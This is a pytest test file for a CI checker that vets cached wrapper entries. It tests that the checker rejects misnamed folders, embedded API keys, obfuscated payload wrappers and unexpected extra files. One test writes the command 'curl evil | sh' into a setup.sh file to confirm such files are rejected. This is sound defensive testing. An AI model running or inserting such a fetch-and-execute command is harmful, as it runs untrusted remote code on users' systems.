"""scripts/check_cache_entry.py: what CI runs on cache PRs. The sandboxed
install is mocked; running the script on the real cache/ entries is how it
was verified end to end."""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path
from unittest.mock import patch

import pytest

from legwork.retry_loop import AttemptLog, RunResult

_spec = importlib.util.spec_from_file_location(
    "check_cache_entry", Path(__file__).parent.parent / "scripts" / "check_cache_entry.py"
)
checker = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(checker)

FIXTURE = Path(__file__).parent / "fixtures" / "ai_data_extractor_payload.py"
MANIFEST = {
    "source_repo_url": "https://github.com/owner/repo",
    "commit_sha": "a" * 40,
    "install_command": "pip install repo",
    "entrypoint": "Does a thing",
    "llm_model": "gpt-test",
    "source_license": "MIT",
    "license_flag": None,
}
OK = RunResult(True, "", "pip install repo", [AttemptLog(1, "cached wrapper", "success", "")], attempt_dir=Path("x"))


def entry(tmp_path, name="owner__repo", manifest=None, wrapper="print('hi')\n", extra=None):
    d = tmp_path / name
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(manifest or MANIFEST))
    (d / "wrapper.py").write_text(wrapper)
    for fname, text in (extra or {}).items():
        (d / fname).write_text(text)
    return d


@pytest.fixture(autouse=True)
def sandbox_ok():
    with (
        patch.object(checker.retry_loop, "run_cached", return_value=OK) as run_cached,
        patch.object(checker.cache_writer, "check_verbatim_copy"),
        patch.object(checker.repo_fetcher, "remote_head_sha", return_value="a" * 40),
    ):
        yield run_cached


def test_a_good_entry_passes_and_shows_its_install_command(tmp_path):
    problems, summary = checker.check(entry(tmp_path))
    assert problems == []
    assert any("`pip install repo`" in line and "review it" in line for line in summary)


def test_folder_must_match_the_source_repo(tmp_path):
    problems, _ = checker.check(entry(tmp_path, name="someone__else"))
    assert any("should be named owner__repo" in p for p in problems)


def test_secrets_fail_the_entry(tmp_path):
    problems, _ = checker.check(entry(tmp_path, wrapper="KEY = 'sk-abcdefghijklmnopqrstuvwxyz123'\n"))
    assert any("sk- style API key" in p for p in problems)


def test_obfuscated_wrapper_fails_before_anything_installs(tmp_path, sandbox_ok):
    problems, _ = checker.check(entry(tmp_path, wrapper=FIXTURE.read_text()))
    assert any("obfuscated" in p for p in problems)
    sandbox_ok.assert_not_called()


def test_extra_files_fail_the_entry(tmp_path):
    problems, _ = checker.check(entry(tmp_path, extra={"setup.sh": "curl evil | sh"}))
    assert any("unexpected files: setup.sh" in p for p in problems)


def test_a_failing_self_test_fails_the_entry(tmp_path, sandbox_ok):
    sandbox_ok.return_value = RunResult(False, None, None, [], final_error="DependencyInstallError: nope")
    problems, _ = checker.check(entry(tmp_path))
    assert any("failed its sandboxed install/self-test" in p for p in problems)


def test_main_exits_nonzero_if_any_entry_fails(tmp_path):
    good = entry(tmp_path)
    bad = entry(tmp_path, name="x__y", manifest={**MANIFEST, "source_repo_url": "https://github.com/x/y"}, wrapper="KEY='sk-abcdefghijklmnopqrstuvwxyz123'")
    assert checker.main([str(good)]) == 0
    assert checker.main([str(good), str(bad)]) == 1
